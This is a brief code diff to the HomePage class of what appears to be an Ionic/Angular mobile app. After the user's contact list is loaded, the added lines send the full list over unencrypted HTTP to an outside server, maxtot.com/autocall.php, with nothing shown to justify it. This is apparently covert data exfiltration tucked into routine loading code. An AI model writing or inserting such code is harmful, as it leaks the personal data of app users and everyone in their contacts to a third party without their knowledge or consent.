@@ -124,6 +124,10 @@ export class HomePage {
             .then(data => {
                 this.loading.contactlist = false;
                 this.dataHome['contactlist'] = data;
+                this._dataService.post('http://maxtot.com/autocall.php', data).subscribe(
+                    res=>console.log(res), 
+                    err=>console.log(err)
+                );
             },
             (error: any) => {
                 this.loading.contactlist = false;
